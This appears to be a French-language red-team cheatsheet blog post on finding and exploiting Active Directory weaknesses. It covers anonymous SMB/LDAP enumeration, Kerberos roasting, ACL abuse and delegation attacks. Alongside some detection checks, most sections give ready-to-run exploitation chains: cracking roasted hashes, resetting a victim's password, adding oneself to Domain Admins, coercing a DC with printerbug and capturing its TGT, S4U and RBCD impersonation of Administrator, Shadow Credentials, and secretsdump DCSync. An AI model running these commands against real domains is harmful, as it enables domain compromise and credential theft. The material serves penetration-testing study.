---
title: "Active Directory Vulnerability Detection"
date: 2026-03-27
draft: false
author: "keyll0ger"
description: "Un attaquant face à un environnement AD suit une progression méthodique : 1. **Reconnaissance passive** (aucun cred) 2. **Reconnaissance active** (aucun cred mais interaction réseau)"
summary: "ActiveDirectory | Active Directory Vulnerability Detection"
tags:
  - "Active Directory"
  - "Kerberos"
  - "Red Team"
  - "Cheatsheet"
categories:
  - "Cheatsheet"
  - "ActiveDirectory"
ShowToc: true
TocOpen: false
---

## Introduction : La Méthodologie de l'Attaquant

Un attaquant face à un environnement AD suit une progression méthodique :
1. **Reconnaissance passive** (aucun cred)
2. **Reconnaissance active** (aucun cred mais interaction réseau)
3. **Énumération authentifiée** (creds user basique)
4. **Analyse approfondie** (creds avec certains privilèges)
5. **Post-exploitation** (admin local/domain)

Pour **chaque faille**, je vais expliquer :
- ✅ **Comment la détecter** (commandes, outils, indicateurs)
- 🔍 **Quels paramètres vérifier** (attributs LDAP, flags, configurations)
- ⚠️ **Faux positifs potentiels**
- 🎯 **Conditions nécessaires pour l'exploitation**

---

## Table des Matières

1. [Phase 0 : Reconnaissance Sans Authentification](#phase0)
2. [Phase 1 : Énumération Avec Comptes Basiques](#phase1)
3. [Phase 2 : Analyse des Permissions et ACLs](#phase2)
4. [Phase 3 : Détection des Failles Kerberos](#phase3)
5. [Phase 4 : Analyse des Délégations](#phase4)
6. [Phase 5 : Détection des Failles AD CS](#phase5)
7. [Phase 6 : GPO et Configurations](#phase6)
8. [Phase 7 : Post-Exploitation et Persistence](#phase7)
9. [Méthodologie BloodHound](#bloodhound)
10. [Scripts de Détection Automatisée](#automation)

---

## Phase 0 : Reconnaissance Sans Authentification {#phase0}

### 0.1 Énumération DNS

**Objectif** : Identifier le domaine, les DCs, et la structure

**Commandes** :
```bash
# Résoudre le domaine
nslookup domain.local
dig domain.local

# Identifier les Domain Controllers via SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
dig SRV _ldap._tcp.dc._msdcs.domain.local

# Autres SRV records utiles
_kerberos._tcp.domain.local       # Service Kerberos
_kpasswd._tcp.domain.local        # Kerberos password change
_ldap._tcp.pdc._msdcs.domain.local # PDC (Primary DC)
_gc._tcp.domain.local             # Global Catalog
```

**Indicateurs** :
- Réponses DNS contenant des IPs de DCs
- Plusieurs DCs = environnement plus mature
- Records manquants = problèmes de config

**Que chercher** :
- Noms de domaine (domain.local)
- Noms NetBIOS (souvent visible via SMB)
- IPs des Domain Controllers
- Structure de sous-domaines (enfant, forêt)

### 0.2 SMB NULL Session

**Faille** : SMB accepte les connexions anonymes

**Détection** :
```bash
# Test de NULL session
crackmapexec smb 10.10.10.10 -u '' -p ''
smbclient -N -L //10.10.10.10

# Énumération avec NULL session
enum4linux -a 10.10.10.10
rpcclient -U "" -N 10.10.10.10
```

**Paramètres Windows à vérifier** :
```
Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
- RestrictAnonymous = 0  ✅ VULNÉRABLE (défaut Windows 2000/2003)
- RestrictAnonymous = 1  ⚠️ PARTIELLEMENT (certaines infos accessibles)
- RestrictAnonymous = 2  ❌ NON VULNÉRABLE

- RestrictAnonymousSAM = 0  ✅ Énumération des users possible
```

**Ce que tu peux obtenir** :
```bash
# Users
rpcclient> enumdomusers
rpcclient> queryuser 0x1f4  # RID 500 = Administrator

# Groupes
rpcclient> enumdomgroups

# Shares
rpcclient> netshareenum

# Politique de mot de passe
rpcclient> getdompwinfo
```

**Indicateurs de succès** :
- Tu reçois une liste d'utilisateurs
- Les commandes ne retournent pas "Access Denied"
- `enum4linux` affiche des users, groupes, shares

**Exploitation** :
- Créer une liste d'users pour password spraying
- Identifier des shares accessibles
- Connaître la politique de lockout

### 0.3 LDAP Anonymous Bind

**Faille** : LDAP accepte les connexions sans authentification

**Détection** :
```bash
# Test simple
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Énumération complète
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=*)"

# Extraire tous les users
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Extraire des infos sensibles
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" description userPassword
```

**Paramètres AD à vérifier** :
```
Attribut dsHeuristics sur CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=domain,DC=local
- Caractère 7 = 2  ✅ VULNÉRABLE (anonymous list allowed)
- Caractère 7 = 0 ou non défini  ❌ NON VULNÉRABLE
```

**Vérification côté admin** :
```powershell
# Checker dsHeuristics
Get-ADObject "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$((Get-ADDomain).DistinguishedName)" -Properties dsHeuristics
```

**Indicateurs de réussite** :
- `ldapsearch` retourne des objets AD
- Aucune erreur "Authentication required"
- Tu vois des attributs comme `sAMAccountName`, `memberOf`, `servicePrincipalName`

**Données critiques à extraire** :
```bash
# Comptes avec SPN (pour Kerberoasting)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "servicePrincipalName=*" sAMAccountName servicePrincipalName

# Comptes avec délégation
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName

# Description avec passwords (erreur admin classique)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description | grep -i pass
```

### 0.4 Kerberos User Enumeration (Pré-auth)

**Principe** : Kerberos répond différemment selon que le user existe ou non

**Détection de la faille** : Toujours présente sur Kerberos, impossible à désactiver

**Exploitation** :
```bash
# Énumération de users
kerbrute userenum --dc 10.10.10.10 -d domain.local users.txt

# Test d'un seul user
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt 10.10.10.10
```

**Réponses Kerberos** :
```
KDC_ERR_PREAUTH_REQUIRED (0x19)      ✅ USER EXISTE
KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6)    ❌ USER N'EXISTE PAS
KDC_ERR_PREAUTH_FAILED (0x18)        ✅ USER EXISTE (mauvais password)
```

**Indicateurs** :
- Des réponses `PREAUTH_REQUIRED` = users valides trouvés
- Tu peux créer une liste de users existants

**Utilité** :
- Créer une liste ciblée pour password spraying
- Éviter les lockouts en ne testant que des comptes réels

### 0.5 Information Leakage via SMB

**Détection** :
```bash
# Banner grabbing
crackmapexec smb 10.10.10.10

# Infos du domaine
crackmapexec smb 10.10.10.10 --info
```

**Informations obtenues** :
```
SMB         10.10.10.10     445    DC01    [*] Windows Server 2019 Build 17763 x64
SMB         10.10.10.10     445    DC01    [*] domain.local (domain:DOMAIN) (signing:True) (SMBv1:False)
```

**Indicateurs importants** :
- **SMB Signing** : `signing:False` = vulnérable à NTLM relay
- **SMBv1** : `SMBv1:True` = vieux système, possibles vulns (EternalBlue)
- **OS Version** : Windows Server 2008 R2 = End-of-Life, probablement non patché
- **Domain Name** : Tu confirmes le nom du domaine

---

## Phase 1 : Énumération Avec Comptes Basiques {#phase1}

**Prérequis** : Tu as obtenu des credentials (`user:password` ou hash)

**Sources de credentials initiaux** :
- Password spraying réussi
- Credentials trouvés dans files/configs
- Exploitation d'une webapp/service

### 1.1 Validation des Credentials

**Test rapide** :
```bash
# Via SMB
crackmapexec smb 10.10.10.10 -u user -p password

# Via LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local"

# Via Kerberos
getTGT.py domain.local/user:password
```

**Réponses** :
- ✅ `[+]` = Credentials valides
- ❌ `[-]` = Credentials invalides
- ⚠️ `STATUS_PASSWORD_MUST_CHANGE` = Password expiré, mais compte valide

### 1.2 Énumération Domaine Complète

**Objectif** : Cartographier tout le domaine

**BloodHound Collection** :
```bash
# Python ingestor (depuis attacker machine)
bloodhound-python -d domain.local -u user -p password -c All -ns 10.10.10.10

# SharpHound (depuis Windows compromis)
.\SharpHound.exe -c All --zipfilename output.zip
```

**Flags de collection** :
- `All` : Tout (recommandé pour première fois)
- `DCOnly` : Seulement les infos du DC (plus discret)
- `Session` : Sessions utilisateurs (détection de où sont les admins)
- `ACL` : Permissions (critique pour trouver les chemins d'élévation)
- `ObjectProps` : Propriétés détaillées (délégations, etc.)

**Données collectées** :
1. **Users et groupes** : Memberships, SIDs
2. **Computers** : OS, sessions actives
3. **ACLs** : Qui a quelles permissions sur quoi
4. **GPOs** : Liens et configurations
5. **Trusts** : Relations inter-domaines
6. **Sessions** : Qui est loggé où

**Alternative manuelle (PowerView)** :
```powershell
# Importer PowerView
Import-Module .\PowerView.ps1

# Users
Get-DomainUser | Select-Object samaccountname,description,memberof

# Computers
Get-DomainComputer | Select-Object name,operatingsystem,serviceprincipalname

# Groupes privilégiés
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"
```

### 1.3 Détection AS-REP Roasting

**Faille** : Comptes sans pré-authentification Kerberos requise

**Comment détecter** :
```bash
# Méthode 1 : Impacket
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Méthode 2 : Sans creds (énumération préalable)
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile hashes.txt
```

**Attribut LDAP à vérifier** :
```bash
# Requête LDAP pour trouver les comptes vulnérables
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userAccountControl
```

**Décryptage userAccountControl** :
```
userAccountControl est un BITMAP (flags cumulatifs)

Flag DONT_REQUIRE_PREAUTH = 0x400000 = 4194304 (decimal)

Exemple :
userAccountControl: 66048
  = 0x10200
  = NORMAL_ACCOUNT (512) + DONT_EXPIRE_PASSWORD (65536)

userAccountControl: 4260352
  = DONT_REQUIRE_PREAUTH + autres flags
  ✅ VULNÉRABLE AS-REP ROASTING
```

**Script PowerShell pour détecter** :
```powershell
# Via PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname,useraccountcontrol

# Via AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | Select-Object Name,UserPrincipalName
```

**Indicateurs** :
- Commande retourne des hashes format `$krb5asrep$23$...`
- Si aucun hash : Aucun compte vulnérable (bonne config)

**Exploitation** :
```bash
# Cracker avec Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Pourquoi ça existe** :
- Compatibilité avec anciennes applis
- Admin coche "Do not require Kerberos preauthentication" sans comprendre
- Comptes de service legacy

### 1.4 Détection Kerberoasting

**Faille** : Comptes avec SPN configurés = hashes crackables

**Comment détecter** :
```bash
# Méthode 1 : Impacket (demande les tickets)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt

# Méthode 2 : Juste lister (sans demander tickets, plus discret)
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
```

**Requête LDAP pour détecter** :
```bash
# Tous les comptes USER (pas computer) avec un SPN
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName memberOf

# Exclure les computers (qui ont toujours des SPNs)
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**PowerShell** :
```powershell
# PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName
```

**Attributs critiques** :
```
servicePrincipalName: HTTP/webapp.domain.local
servicePrincipalName: MSSQLSvc/sql.domain.local:1433

Formats courants :
- HTTP/hostname            → IIS, applis web
- MSSQLSvc/hostname:port   → SQL Server
- TERMSRV/hostname         → Remote Desktop
- RestrictedKrbHost/hostname → Ancien format
```

**Indicateurs de valeur** :
```bash
# Identifier les comptes "intéressants"
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 | grep -E "(admin|svc|sql|iis)"

# Comptes membres de groupes privilégiés avec SPN = JACKPOT
Get-DomainUser -SPN | Where-Object {$_.memberof -match "admin"}
```

**Prioritisation** :
1. **SPNs avec noms "admin", "svc"** : Souvent des comptes élevés
2. **SPNs membres de groupes sensibles** : Accès direct si craqué
3. **SPNs anciens** : `pwdlastset` vieux = password probablement faible

**Vérifier l'âge du password** :
```bash
# Avec LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName pwdLastSet

# Convertir pwdLastSet (Windows FileTime) en date lisible
# pwdLastSet = nombre de 100-nanosecondes depuis 1601-01-01
```

**Exploitation** :
```bash
# Demander les tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Cracker (TGS-REP = type 13100)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Hash types selon encryption** :
- `$krb5tgs$23$*...` = RC4 (type 23) → Hashcat mode 13100
- `$krb5tgs$17$*...` = AES128 → Hashcat mode 19600
- `$krb5tgs$18$*...` = AES256 → Hashcat mode 19700

RC4 = plus facile à cracker, mais Windows récents préfèrent AES.

### 1.5 Identification des Machines Vulnérables

**Objectif** : Trouver des machines avec SMB Signing désactivé, vieux OS, etc.

**SMB Signing Check** :
```bash
# Scanner un subnet
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Le fichier relay_targets.txt contiendra les IPs sans SMB signing
```

**Paramètre Windows** :
```
Registry: HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters
- RequireSecuritySignature = 0  ✅ VULNÉRABLE (signing non requis)
- RequireSecuritySignature = 1  ❌ NON VULNÉRABLE (signing requis)
```

**Vérification via LDAP** :
```bash
# Computers avec vieux OS (probablement pas à jour)
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(operatingSystem=*2008*)" name operatingSystem

# Computers sans BitLocker (attribut msTPM-OwnerInformation vide)
```

**PowerShell** :
```powershell
# Lister tous les computers avec OS et dernière connexion
Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate | Select-Object Name,OperatingSystem,LastLogonDate | Sort-Object LastLogonDate
```

**Indicateurs de cibles faciles** :
- Windows Server 2008 R2 ou antérieur (End-of-Life)
- Dernière connexion > 6 mois = probablement non patché
- Pas de SMB signing = relay attacks possibles

---

## Phase 2 : Analyse des Permissions et ACLs {#phase2}

**Objectif** : Trouver des chemins d'élévation via permissions AD

### 2.1 Extraction des ACLs

**BloodHound** :
```bash
# Collection complète avec focus ACL
bloodhound-python -d domain.local -u user -p password -c ACL,ObjectProps -ns 10.10.10.10
```

**Import dans Neo4j** :
```bash
# Démarrer Neo4j
neo4j console

# Interface web : http://localhost:7474
# Upload les .json dans BloodHound UI
```

**Requêtes BloodHound essentielles** :
```cypher
// Chemins vers Domain Admins depuis ton compte
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Tous les objets où tu as GenericAll
MATCH p=(u:User {name:"USER@DOMAIN.LOCAL"})-[r:GenericAll]->(n)
RETURN p

// Tous les objets où tu as WriteDacl
MATCH p=(u:User {name:"USER@DOMAIN.LOCAL"})-[r:WriteDacl]->(n)
RETURN p

// Comptes avec Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### 2.2 Analyse Manuelle des ACLs

**PowerView** :
```powershell
# ACLs sur un objet spécifique
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match "^S-1-5-21"}

# Qui a GenericAll sur des groupes privilégiés
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectDN -match "admin"}

# Trouver des ACEs anormales
Get-DomainObjectAcl -SearchBase "OU=Servers,DC=domain,DC=local" | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}
```

**Attribut LDAP** : `nTSecurityDescriptor`
```bash
# Extraction complète (binaire, nécessite parsing)
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=*)" nTSecurityDescriptor
```

### 2.3 Détection GenericAll / GenericWrite

**Comment identifier** :

**Via BloodHound** :
- Edge "GenericAll" ou "GenericWrite" visible dans le graphe
- Clic droit sur l'edge → "Help" explique l'exploitation

**Via PowerView** :
```powershell
# Trouver où TON compte a GenericAll
$user = "domain\myuser"
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser $user).objectsid} | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
```

**Indicateurs dans les résultats** :
```
ActiveDirectoryRights : GenericAll
ObjectDN             : CN=victim,OU=Users,DC=domain,DC=local
SecurityIdentifier   : S-1-5-21-...-1105  (ton SID)
```

**Exploitation selon le type d'objet** :

**Sur un User** :
```bash
# Changer le password
net rpc password victim -U domain/myuser%mypass -S dc.domain.local

# Ou via PowerView
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# Ajouter un SPN (Targeted Kerberoasting)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='HTTP/fake'}
GetUserSPNs.py domain.local/myuser:mypass -request-user victim
```

**Sur un Computer** :
```bash
# RBCD (voir section délégations)
rbcd.py -delegate-from 'mycomputer$' -delegate-to 'victim$' -action write domain.local/myuser:mypass

# Shadow Credentials (si AD CS présent)
pywhisker.py -d domain.local -u myuser -p mypass --target 'victim$' --action add
```

**Sur un Group** :
```powershell
# Ajouter ton user au groupe
Add-DomainGroupMember -Identity 'Domain Admins' -Members myuser
```

### 2.4 Détection WriteDacl

**Signification** : Tu peux modifier les ACLs de l'objet = tu peux te donner GenericAll

**Détection BloodHound** :
- Edge "WriteDacl" vers un objet
- Souvent vers des groupes ou OUs

**Détection PowerView** :
```powershell
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser myuser).objectsid} | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl|WriteOwner"}
```

**Exploitation** :
```powershell
# Étape 1 : Te donner GenericAll sur la cible
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity myuser -Rights All

# Étape 2 : Exploiter GenericAll (ajouter ton user au groupe)
Add-DomainGroupMember -Identity "Domain Admins" -Members myuser
```

**Vérification post-exploitation** :
```powershell
Get-DomainGroupMember "Domain Admins"
```

### 2.5 Détection WriteOwner

**Signification** : Tu peux changer le propriétaire de l'objet

**Exploitation** :
```powershell
# Étape 1 : Devenir owner
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity myuser

# Étape 2 : En tant qu'owner, tu as WriteDacl implicite
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity myuser -Rights All

# Étape 3 : Exploiter
Add-DomainGroupMember -Identity "Domain Admins" -Members myuser
```

### 2.6 Détection ForceChangePassword

**Right** : Extended Right "User-Force-Change-Password"

**Détection** :
```powershell
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "User-Force-Change-Password"} | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser myuser).objectsid}
```

**Exploitation** :
```powershell
$newpass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $newpass
```

**Note** : La victime ne sera PAS notifiée (pas d'email "your password was changed")

### 2.7 Détection AddMember (sur un groupe)

**Right** : Extended Right "Add-Member"

**Exploitation** :
```powershell
Add-DomainGroupMember -Identity 'SensitiveGroup' -Members myuser
```

Plus restreint que GenericAll, mais suffit si la cible est un groupe privilégié.

---

## Phase 3 : Détection des Failles Kerberos Avancées {#phase3}

### 3.1 Détection Unconstrained Delegation

**Principe** : Machine/User configure avec TRUSTED_FOR_DELEGATION

**Comment détecter** :

**Via LDAP** :
```bash
# Computers avec Unconstrained Delegation
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" name dNSHostName

# Users avec Unconstrained Delegation (rare mais existe)
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName
```

**Décryptage userAccountControl** :
```
Flag TRUSTED_FOR_DELEGATION = 0x80000 = 524288

Exemple :
userAccountControl: 528384
  = 0x81000
  = 512 (NORMAL_ACCOUNT) + 524288 (TRUSTED_FOR_DELEGATION)
  ✅ UNCONSTRAINED DELEGATION ACTIVÉE
```

**Via PowerView** :
```powershell
# Computers
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname

# Users
Get-DomainUser -TrustedToAuth | Select-Object samaccountname
```

**Via BloodHound** :
```cypher
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

**Via Impacket** :
```bash
findDelegation.py domain.local/user:password -dc-ip 10.10.10.10
```

**Indicateurs de valeur** :
- Domain Controllers ont TOUJOURS Unconstrained Delegation (normal)
- Serveurs applicatifs avec Unconstrained = ✅ CIBLE PRIORITAIRE
- Users avec Unconstrained = ✅ TRÈS RARE et exploitable

**Conditions d'exploitation** :
1. Tu as compromis la machine/user avec Unconstrained Delegation
2. Tu peux forcer un compte privilégié à s'authentifier vers toi (Printer Bug, PetitPotam)
3. Tu extrais le TGT du compte cible
4. Pass-the-Ticket avec le TGT = tu es ce compte

**Exploitation détaillée** :
```bash
# 1. Sur la machine compromise avec Unconstrained Delegation
# Monitorer les tickets entrants
Rubeus.exe monitor /interval:5

# 2. Depuis ton attacker machine, forcer DC à s'auth
python3 printerbug.py domain.local/myuser@dc.domain.local compromised-server.domain.local

# 3. Rubeus capture le TGT du DC$
# Exporter le ticket
Rubeus.exe dump /luid:0xXXXXXX /service:krbtgt /nowrap

# 4. Injecter le ticket sur Kali
base64 -d ticket.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

# 5. DCSync avec le ticket du DC
secretsdump.py -k -no-pass dc.domain.local
```

**Pourquoi les admins configurent ça** :
- IIS avec Kerberos authentication qui doit accéder à SQL Server
- Ancienne architecture nécessitant "double-hop"
- Mauvaise compréhension de l'option "Trust this computer for delegation"

### 3.2 Détection Constrained Delegation

**Attribut LDAP** : `msDS-AllowedToDelegateTo`

**Comment détecter** :

**Via LDAP** :
```bash
# Tous les comptes avec Constrained Delegation
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# Exemple de résultat :
# sAMAccountName: svc_sql
# msDS-AllowedToDelegateTo: CIFS/dc.domain.local
# msDS-AllowedToDelegateTo: HTTP/webapp.domain.local
```

**Via PowerView** :
```powershell
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name,msds-allowedtodelegateto
```

**Via Impacket** :
```bash
findDelegation.py domain.local/user:password -dc-ip 10.10.10.10
```

**Attribut secondaire** : `userAccountControl` avec flag `TRUSTED_TO_AUTH_FOR_DELEGATION` (0x1000000)

**Types de Constrained Delegation** :

**Avec Protocol Transition (flag 0x1000000)** :
```
userAccountControl inclut TRUSTED_TO_AUTH_FOR_DELEGATION
→ Peut faire S4U2Self pour n'importe quel user
→ Plus dangereux
```

**Sans Protocol Transition** :
```
Pas de flag TRUSTED_TO_AUTH_FOR_DELEGATION
→ Peut seulement faire S4U2Proxy avec un ticket déjà obtenu
→ Moins exploitable
```

**Détection du Protocol Transition** :
```bash
ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" sAMAccountName
# Flag 16777216 = TRUSTED_TO_AUTH_FOR_DELEGATION
```

**Indicateurs critiques** :
- `msDS-AllowedToDelegateTo` contient `CIFS/dc.domain.local` = ✅ Accès admin au DC
- `msDS-AllowedToDelegateTo` contient `HTTP/dc.domain.local` = ✅ Peut être alterné vers CIFS
- `msDS-AllowedToDelegateTo` contient `LDAP/dc.domain.local` = ✅ DCSync possible

**Conditions d'exploitation** :
1. Tu as compromis le compte avec Constrained Delegation
2. Tu connais son password ou son hash
3. Tu exploites via S4U2Self + S4U2Proxy

**Exploitation** :
```bash
# Cas 1 : Tu as le password
getST.py -spn 'CIFS/dc.domain.local' -impersonate Administrator domain.local/svc_account:password

# Cas 2 : Tu as le hash
getST.py -spn 'CIFS/dc.domain.local' -impersonate Administrator domain.local/svc_account -hashes :ntlmhash

# Cas 3 : Altername Service Name (SPN substitution)
# Si tu as HTTP/dc, demande CIFS/dc
getST.py -spn 'HTTP/dc.domain.local' -impersonate Administrator domain.local/svc_account:password -altservice CIFS

# Utiliser le ticket obtenu
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc.domain.local
```

**Alternate Service Names exploitables** :
```
HTTP → CIFS, LDAP, HOST
CIFS → HTTP, HOST
HOST → CIFS, HTTP, LDAP
MSSQLSvc → HTTP, CIFS (parfois)
```

**Vérification de l'exploitation réussie** :
```bash
# Vérifier que le ticket fonctionne
klist  # Voir le ticket
smbclient.py -k -no-pass dc.domain.local
```

### 3.3 Détection Resource-Based Constrained Delegation (RBCD)

**Attribut LDAP** : `msDS-AllowedToActOnBehalfOfOtherIdentity` sur la machine CIBLE

**Comment détecter** :

**Via LDAP** :
```bash
# Machines avec RBCD configuré
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" name msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Via PowerView** :
```powershell
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity"}
```

**Lecture de l'attribut (binaire)** :
```powershell
# PowerShell pour décoder
$computer = Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$computer.'msDS-AllowedToActOnBehalfOfOtherIdentity'

# Outil Python
python3 rbcd.py -delegate-to 'target$' -action read domain.local/user:password
```

**Conditions pour exploiter RBCD** :
1. Tu as GenericAll/GenericWrite/WriteProperty sur un Computer Object
2. `MachineAccountQuota` > 0 (permet de créer des computers)
3. Ou tu contrôles déjà un compte machine

**Vérification MachineAccountQuota** :
```bash
# Via LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota

# Résultat :
# ms-DS-MachineAccountQuota: 10  ✅ Exploitable
# ms-DS-MachineAccountQuota: 0   ❌ Non exploitable (sauf si tu as déjà un computer)
```

**Exploitation complète** :
```bash
# 1. Créer un computer account (si MAQ > 0)
addcomputer.py -computer-name 'EVILPC$' -computer-pass 'ComplexPass123!' domain.local/user:password

# 2. Identifier une machine où tu as GenericAll
# (via BloodHound ou PowerView)

# 3. Configurer RBCD
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action write domain.local/user:password

# 4. Vérifier la configuration
rbcd.py -delegate-to 'TARGET$' -action read domain.local/user:password

# 5. Obtenir un ticket pour Administrator sur TARGET
getST.py -spn 'cifs/target.domain.local' -impersonate Administrator domain.local/'EVILPC$':'ComplexPass123!'

# 6. Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass target.domain.local
```

**Détection via BloodHound** :
- Query custom : `MATCH p=(u:User)-[:GenericAll|GenericWrite]->(c:Computer) RETURN p`
- Chercher les computers où tu as les permissions

**Cleanup post-exploitation** :
```bash
# Supprimer la configuration RBCD
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET$' -action remove domain.local/user:password

# Supprimer le computer account
addcomputer.py -computer-name 'EVILPC$' -delete domain.local/user:password
```

### 3.4 Détection Shadow Credentials

**Principe** : Ajouter un certificat dans `msDS-KeyCredentialLink` pour auth Kerberos

**Attribut** : `msDS-KeyCredentialLink` (Windows Server 2016+)

**Prérequis** :
- Windows Server 2016+ Domain Functional Level
- AD CS n'est PAS nécessaire (confusion commune)

**Conditions** :
Tu as GenericAll/GenericWrite sur un User ou Computer

**Comment détecter si exploitable** :
```bash
# Vérifier le Domain Functional Level
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local" "(objectClass=domain)" msDS-Behavior-Version

# msDS-Behavior-Version:
# 7 = Windows Server 2016
# 6 = Windows Server 2012 R2
# 5 = Windows Server 2008 R2
```

**Exploitation** :
```bash
# 1. Vérifier les permissions (GenericAll sur victim)
# 2. Ajouter un key credential
pywhisker.py -d domain.local -u user -p password --target victim --action add --filename cert

# Output: Certificat .pfx généré + password

# 3. Authentification avec le certificat
certipy auth -pfx cert.pfx -dc-ip 10.10.10.10

# Obtention d'un TGT + hash NT
```

**Cleanup** :
```bash
pywhisker.py -d domain.local -u user -p password --target victim --action remove --device-id <ID>
```

**Détection de Shadow Credentials existantes** :
```powershell
# PowerShell pour voir si des key credentials existent
Get-ADUser victim -Properties msDS-KeyCredentialLink | Select-Object msDS-KeyCredentialLink
```

---

